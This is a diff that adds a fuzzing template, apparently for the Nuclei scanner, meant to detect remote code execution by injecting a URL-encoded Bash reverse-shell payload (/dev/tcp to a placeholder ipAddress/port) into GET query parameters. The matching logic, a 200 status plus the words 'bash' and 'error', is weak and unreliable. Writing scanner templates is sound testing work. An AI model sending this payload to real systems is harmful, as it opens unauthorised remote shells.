@@ -1,0 +1,40 @@
+id: fuzz-rce-bash
+
+info:
+  name: Bash Command Execution Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template aims to detect Remote Code Execution (RCE) vulnerabilities 
+    via a specific Bash command payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce_payload:
+        - "bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ipAddress/port%200%3E%261%27"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bash"
+          - "error"  # Assuming you might look for an error indicative of command execution
+
+      - type: status
+        status:
+          - 200  # Assuming a successful response implies the command might have executed
